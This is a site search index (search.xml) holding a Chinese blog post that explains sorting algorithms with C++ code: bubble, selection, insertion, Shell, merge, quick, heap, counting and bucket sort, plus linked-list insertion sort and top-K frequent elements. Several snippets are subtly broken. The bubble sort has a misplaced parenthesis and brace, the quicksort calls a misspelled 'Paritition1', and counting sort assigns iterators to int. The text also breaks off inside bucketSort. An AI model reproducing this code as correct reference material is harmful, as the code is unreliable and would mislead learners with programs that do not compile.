<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>排序算法篇</title>
    <link href="/2024/08/22/LeetCode/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E7%AF%87/"/>
    <url>/2024/08/22/LeetCode/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202408291036584.png"alt="image-20240826140629246" /><figcaption aria-hidden="true">image-20240826140629246</figcaption></figure><h1 id="冒泡排序">1. 冒泡排序</h1><blockquote><p>比较相邻的元素。如果第一个比第二个大，就交换他们两个。对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对。这步做完后，最后的元素会是最大的数。针对所有的元素重复以上的步骤，除了最后一个。持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">bubble_sort</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> len)</span> </span>&#123;<br>    <span class="hljs-type">int</span> i, j;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; len - <span class="hljs-number">1</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; len - <span class="hljs-number">1</span> - i; j++) &#123;<br>            <span class="hljs-keyword">if</span> (arr[j] &gt; arr[j + <span class="hljs-number">1</span>] &#123; <br>                <span class="hljs-built_in">swap</span>(arr[j], arr[j + <span class="hljs-number">1</span>]); <br>            &#125;)<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="选择排序">2. 选择排序</h1><blockquote><p>首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置。再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。重复第二步，直到所有元素均排序完毕。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">selection_sort</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> len)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len - <span class="hljs-number">1</span>; i++) &#123;<br>        <span class="hljs-type">int</span> min = i;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = i + <span class="hljs-number">1</span>; j &lt; len; j++) &#123;<br>            <span class="hljs-keyword">if</span> (arr[j] &lt; arr[min]) &#123;<br>                min = j;<br>            &#125;<br>        &#125;<br>        <span class="hljs-built_in">swap</span>(arr[i], arr[min]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="插入排序">3. 插入排序</h1><blockquote><p>通过构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到相应位置并插入。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">insertion_sort</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; arr,<span class="hljs-type">int</span> len)</span></span>&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;len;i++)&#123;<br>                <span class="hljs-type">int</span> key=arr[i];<br>                <span class="hljs-type">int</span> j=i<span class="hljs-number">-1</span>;<br>                <span class="hljs-keyword">while</span>((j&gt;=<span class="hljs-number">0</span>) &amp;&amp; (key&lt;arr[j]))&#123;<br>                        arr[j+<span class="hljs-number">1</span>]=arr[j];<br>                        j--;<br>                &#125;<br>                arr[j+<span class="hljs-number">1</span>]=key;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="对链表进行插入排序">对链表进行插入排序</h2><blockquote><ol type="1"><li><p>创建哑节点 dummyHead，令 dummyHead.next =head。引入哑节点是为了便于在 head 节点之前插入节点。</p></li><li><p>维护 lastSorted 为链表的已排序部分的最后一个节点，初始时lastSorted = head。</p></li><li><p>维护 curr 为待插入的元素，初始时 curr = head.next。</p></li><li><p>比较 lastSorted 和 curr 的节点值。若 lastSorted.val &lt;=curr.val，说明 curr 应该位于 lastSorted 之后，将 lastSorted后移一位，curr 变成新的lastSorted。否则，从链表的头节点开始往后遍历链表中的节点，寻找插入 curr的位置。令 prev 为插入 curr 的位置的前一个节点，进行如下操作，完成对curr 的插入：</p></li></ol><p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">lastSorted.next = curr.next<br>curr.next = prev.next<br>prev.next = curr<br></code></pre></td></tr></table></figure></p><ol start="5" type="1"><li><p>令 curr = lastSorted.next，此时 curr为下一个待插入的元素。</p></li><li><p>重复第 4 步和第 5 步，直到 curr 变成空，排序结束。</p></li><li><p>返回 dummyHead.next，为排序后的链表的头节点。</p></li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">insertionSortList</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        ListNode* dummyHead = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">0</span>, head);<br>        ListNode* lastSorted = head;<br>        ListNode* curr = head-&gt;next;<br><br>        <span class="hljs-keyword">while</span> (curr != <span class="hljs-literal">nullptr</span>) &#123;<br>            <span class="hljs-keyword">if</span> (lastSorted-&gt;val &lt;= curr-&gt;val) &#123;<br>                lastSorted = lastSorted-&gt;next;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                ListNode* prev = dummyHead;<br>                <span class="hljs-keyword">while</span> (prev-&gt;next-&gt;val &lt;= curr-&gt;val) &#123;<br>                    prev = prev-&gt;next;<br>                &#125;<br>                lastSorted-&gt;next = curr-&gt;next;<br>                curr-&gt;next = prev-&gt;next;<br>                prev-&gt;next = curr;<br>            &#125;<br>            curr = lastSorted-&gt;next;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> dummyHead-&gt;next;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="希尔排序">4. 希尔排序</h1><blockquote><ol type="1"><li>先将整个待排序的数组分割成若干个子序列（子数组），然后对每个子序列进行直接插入排序。</li><li>在刚开始时，子序列的间隔较大，这样可以让每次交换带来较大的移动，从而使数组更快趋于有序。</li><li>随着间隔逐渐缩小，整个数组变得越来越有序，最终当间隔为 1时，整个数组就可以通过一次直接插入排序达到完全有序。</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">shell_sort</span><span class="hljs-params">(T array[], <span class="hljs-type">int</span> length)</span> </span>&#123;<br>    <span class="hljs-type">int</span> h = <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">// 计算初始的间隔 h</span><br>    <span class="hljs-keyword">while</span> (h &lt; length / <span class="hljs-number">3</span>) &#123;<br>        h = <span class="hljs-number">3</span> * h + <span class="hljs-number">1</span>;  <span class="hljs-comment">// 使用 Knuth 增量序列：h = 1, 4, 13, 40, ...</span><br>    &#125;<br><br>    <span class="hljs-comment">// 开始排序</span><br>    <span class="hljs-keyword">while</span> (h &gt;= <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-comment">// 对每个子序列进行插入排序</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = h; i &lt; length; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = i; j &gt;= h &amp;&amp; array[j] &lt; array[j - h]; j -= h) &#123;<br>                <span class="hljs-built_in">swap</span>(array[j], array[j - h]);  <span class="hljs-comment">// 交换两个元素的位置</span><br>            &#125;<br>        &#125;<br>        h = h / <span class="hljs-number">3</span>;  <span class="hljs-comment">// 缩小间隔</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="归并排序">5. 归并排序</h1><blockquote><p>1、<strong>分解</strong>未排序 <strong><em>n</em></strong>个元素的序列成 各有 <strong><em>n/2</em></strong> 个元素的连续子序列；2、<strong>递归</strong>排序两个连续子序列；3、<strong>合并</strong>两个已排序的连续子序列构成整个完成排序的序列。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Merge</span><span class="hljs-params">(<span class="hljs-type">int</span> a[], <span class="hljs-type">int</span> left, <span class="hljs-type">int</span> mid, <span class="hljs-type">int</span> right)</span></span>&#123;<br>    <span class="hljs-type">int</span> temp[right - left + <span class="hljs-number">1</span>];                   <br>    <span class="hljs-type">int</span> i = left;                                  <br>    <span class="hljs-type">int</span> j = mid + <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> k = <span class="hljs-number">0</span>;                                    <br><br>    <span class="hljs-keyword">while</span>( i &lt;= mid &amp;&amp; j &lt;= right )&#123;<br>    <span class="hljs-keyword">if</span>(a[i] &lt; a[j])                      <br>        temp[k++] = a[i++];                  <br>    <span class="hljs-keyword">else</span><br>        temp[k++] = a[j++];<br>    &#125;<br><br>    <span class="hljs-keyword">while</span>( i &lt;= mid )                             <br>    temp[k++] = a[i++];<br>    <span class="hljs-keyword">while</span>( j &lt;= right )                           <br>    temp[k++] = a[j++];<br>    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> m = left, n = <span class="hljs-number">0</span>; m &lt;= right; m++, n++)<br>    a[m] = temp[n];<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Merge_Sort</span><span class="hljs-params">(<span class="hljs-type">int</span> a[], <span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right)</span></span>&#123;<br>    <span class="hljs-keyword">if</span>( left == right )<br>    <span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-type">int</span> mid = (left + right)/<span class="hljs-number">2</span>;<br><br>    <span class="hljs-built_in">Merge_Sort</span>(a, left, mid);            <br>    <span class="hljs-built_in">Merge_Sort</span>(a, mid + <span class="hljs-number">1</span>, right);<br>    <br>    <span class="hljs-built_in">Merge</span>(a, left, mid, right);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="快速排序">6. 快速排序</h1><blockquote><ol type="1"><li>从数列中挑出一个元素，称为 "基准"（pivot）;</li><li>重新排序数列，所有元素比基准值小的摆放在基准前面，所有元素比基准值大的摆在基准的后面（相同的数可以到任一边）。在这个分区退出之后，该基准就处于数列的中间位置。这个称为分区（partition）操作；</li><li>递归地（recursive）把小于基准值元素的子数列和大于基准值元素的子数列排序。</li></ol><p><em>快速排序的最坏运行情况是O(n²)，比如说顺序数列的快排。但它的平摊期望时间是 O(nlogn)，且 O(nlogn)记号中隐含的常数因子很小，比复杂度稳定等于 O(nlogn)的归并排序要小很多。所以，对绝大多数顺序性较弱的随机数列而言，快速排序总是优于归并排序。</em></p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 标准分割函数</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Partition1</span><span class="hljs-params">(<span class="hljs-type">int</span> A[], <span class="hljs-type">int</span> low, <span class="hljs-type">int</span> high)</span> </span>&#123;<br>    <span class="hljs-type">int</span> pivot = A[low]; <span class="hljs-comment">// 选择数组的第一个元素作为基准值</span><br>    <span class="hljs-keyword">while</span> (low &lt; high) &#123;<br>        <span class="hljs-comment">// 从右向左扫描，寻找小于基准值的元素</span><br>        <span class="hljs-keyword">while</span> (low &lt; high &amp;&amp; A[high] &gt;= pivot) &#123;<br>            --high;<br>        &#125;<br>        A[low] = A[high]; <span class="hljs-comment">// 将找到的小于基准值的元素放到左侧</span><br><br>        <span class="hljs-comment">// 从左向右扫描，寻找大于基准值的元素</span><br>        <span class="hljs-keyword">while</span> (low &lt; high &amp;&amp; A[low] &lt;= pivot) &#123;<br>            ++low;<br>        &#125;<br>        A[high] = A[low]; <span class="hljs-comment">// 将找到的大于基准值的元素放到右侧</span><br>    &#125;<br>    A[low] = pivot; <span class="hljs-comment">// 基准值归位</span><br>    <span class="hljs-keyword">return</span> low;     <span class="hljs-comment">// 返回基准值的位置</span><br>&#125;<br><br><span class="hljs-comment">// 快排母函数</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QuickSort</span><span class="hljs-params">(<span class="hljs-type">int</span> A[], <span class="hljs-type">int</span> low, <span class="hljs-type">int</span> high)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (low &lt; high) &#123;<br>        <span class="hljs-type">int</span> pivot = <span class="hljs-built_in">Paritition1</span>(A, low, high);<br>        <span class="hljs-built_in">QuickSort</span>(A, low, pivot - <span class="hljs-number">1</span>);<br>        <span class="hljs-built_in">QuickSort</span>(A, pivot + <span class="hljs-number">1</span>, high);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="堆排序">7. 堆排序</h1><blockquote><p>堆排序（Heapsort）是指利用堆这种数据结构所设计的一种排序算法。堆积是一个近似完全二叉树的结构，并同时满足堆积的性质：即子结点的键值或索引总是小于（或者大于）它的父节点。堆排序可以说是一种利用堆的概念来排序的选择排序。分为两种方法：</p><ul><li>大顶堆：每个节点的值都大于或等于其子节点的值，在堆排序算法中用于升序排列；</li><li>小顶堆：每个节点的值都小于或等于其子节点的值，在堆排序算法中用于降序排列；</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 堆化函数，将以index为根的子树调整为最大堆</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">heapify</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> n, <span class="hljs-type">int</span> index)</span> </span>&#123;<br>    <span class="hljs-type">int</span> largest = index;          <span class="hljs-comment">// 初始化最大值为根节点</span><br>    <span class="hljs-type">int</span> left = <span class="hljs-number">2</span> * index + <span class="hljs-number">1</span>;     <span class="hljs-comment">// 左子节点</span><br>    <span class="hljs-type">int</span> right = <span class="hljs-number">2</span> * index + <span class="hljs-number">2</span>;    <span class="hljs-comment">// 右子节点</span><br><br>    <span class="hljs-comment">// 如果左子节点存在且大于根节点</span><br>    <span class="hljs-keyword">if</span> (left &lt; n &amp;&amp; arr[left] &gt; arr[largest])<br>        largest = left;<br><br>    <span class="hljs-comment">// 如果右子节点存在且大于当前最大值</span><br>    <span class="hljs-keyword">if</span> (right &lt; n &amp;&amp; arr[right] &gt; arr[largest])<br>        largest = right;<br><br>    <span class="hljs-comment">// 如果最大值不是根节点，交换并继续堆化</span><br>    <span class="hljs-keyword">if</span> (largest != index) &#123;<br>        <span class="hljs-built_in">swap</span>(arr[index], arr[largest]);<br>        <span class="hljs-built_in">heapify</span>(arr, n, largest);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 堆排序主函数</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">heapSort</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> </span>&#123;<br>    <span class="hljs-type">int</span> n = arr.<span class="hljs-built_in">size</span>();<br><br>    <span class="hljs-comment">// 构建大根堆（从最后一个非叶子节点向上）</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = n / <span class="hljs-number">2</span> - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>        <span class="hljs-built_in">heapify</span>(arr, n, i);<br><br>    <span class="hljs-comment">// 调整大根堆</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = n - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        <span class="hljs-built_in">swap</span>(arr[<span class="hljs-number">0</span>], arr[i]);          <span class="hljs-comment">// 将当前最大值移到数组末尾</span><br>        <span class="hljs-built_in">heapify</span>(arr, i, <span class="hljs-number">0</span>);            <span class="hljs-comment">// 调整剩余元素形成最大堆</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="前-k-个高频元素">前 K 个高频元素</h2><blockquote><p>借助 哈希表来建立数字和其出现次数的映射，遍历一遍数组统计元素的频率；维护一个元素数目为k的最小堆；每次都将新的元素与堆顶元素（堆中频率最小的元素）进行比较；如果新的元素的频率比堆顶端的元素大，则弹出堆顶端的元素，将新的元素添加进堆中；最终，堆中的k 个元素即为前 k 个高频元素。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">topKFrequent</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>        unordered_map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; mp;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : nums) &#123;<br>            mp[num]++;<br>        &#125;<br><br>        priority_queue&lt;pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;, vector&lt;pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt;, greater&lt;pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt;&gt; minHeap;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> entry : mp) &#123;<br>            minHeap.<span class="hljs-built_in">push</span>(&#123;entry.second, entry.first&#125;);<br>            <span class="hljs-keyword">if</span> (minHeap.<span class="hljs-built_in">size</span>() &gt; k) &#123;<br>                minHeap.<span class="hljs-built_in">pop</span>();<br>            &#125;<br>        &#125;<br><br>        vector&lt;<span class="hljs-type">int</span>&gt; res;<br>        <span class="hljs-keyword">while</span> (!minHeap.<span class="hljs-built_in">empty</span>()) &#123;<br>            res.<span class="hljs-built_in">push_back</span>(minHeap.<span class="hljs-built_in">top</span>().second);<br>            minHeap.<span class="hljs-built_in">pop</span>();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="计数排序">8. 计数排序</h1><blockquote><p>计数排序是一种非比较排序算法，适用于一定范围内的整数排序。它通过计数每个元素出现的次数，然后依次将这些元素放回原数组，从而实现排序。它的时间复杂度为O(n+ k)，其中n是待排序元素的数量，k是待排序元素的最大值与最小值的差。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">countingSort</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (arr.<span class="hljs-built_in">empty</span>()) <span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-type">int</span> maxVal = <span class="hljs-built_in">max_element</span>(arr.<span class="hljs-built_in">begin</span>(), arr.<span class="hljs-built_in">end</span>());<br>    <span class="hljs-type">int</span> minVal = <span class="hljs-built_in">min_element</span>(arr.<span class="hljs-built_in">begin</span>(), arr.<span class="hljs-built_in">end</span>());<br>    <span class="hljs-type">int</span> range = maxVal - minVal + <span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">// 创建计数数组并初始化为0</span><br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">count</span><span class="hljs-params">(range, <span class="hljs-number">0</span>)</span></span>;<br><br>    <span class="hljs-comment">// 计算每个元素的出现次数</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : arr) &#123;<br>        count[num - minVal]++;<br>    &#125;<br><br>    <span class="hljs-comment">// 将计数数组中的值累加</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; range; i++) &#123;<br>        count[i] += count[i - <span class="hljs-number">1</span>];<br>    &#125;<br><br>    <span class="hljs-comment">// 创建输出数组</span><br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">output</span><span class="hljs-params">(arr.size())</span></span>;<br><br>    <span class="hljs-comment">// 反向遍历原数组，将元素放在正确位置</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = arr.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        output[count[arr[i] - minVal] - <span class="hljs-number">1</span>] = arr[i];<br>        count[arr[i] - minVal]--;<br>    &#125;<br><br>    <span class="hljs-comment">// 将排序后的数组复制回原数组</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; arr.<span class="hljs-built_in">size</span>(); i++) &#123;<br>        arr[i] = output[i];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="桶排序">9. 桶排序</h1><blockquote><p>桶排序是一种基于分布的排序算法，特别适用于数据均匀分布在某个范围内的情况。它通过将元素分散到不同的桶（即区间）中，分别对每个桶进行排序，然后将各个桶中的元素合并起来，得到最终的有序数组。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 插入排序函数，用于对桶内的元素排序</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">insertionSort</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; bucket)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; bucket.<span class="hljs-built_in">size</span>(); i++) &#123;<br>        <span class="hljs-type">int</span> key = bucket[i];<br>        <span class="hljs-type">int</span> j = i - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (j &gt;= <span class="hljs-number">0</span> &amp;&amp; bucket[j] &gt; key) &#123;<br>            bucket[j + <span class="hljs-number">1</span>] = bucket[j];<br>            j--;<br>        &#125;<br>        bucket[j + <span class="hljs-number">1</span>] = key;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">bucketSort</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> bucketSize)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (arr.<span class="hljs-built_in">empty</span>()) <span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-comment">// 找到数组中的最大值和最小值</span><br>    <span class="hljs-type">int</span> minVal = <span class="hljs-built_in">min_element</span>(arr.<span class="hljs-built_in">begin</span>(), arr.<span class="hljs-built_in">end</span>());<br>    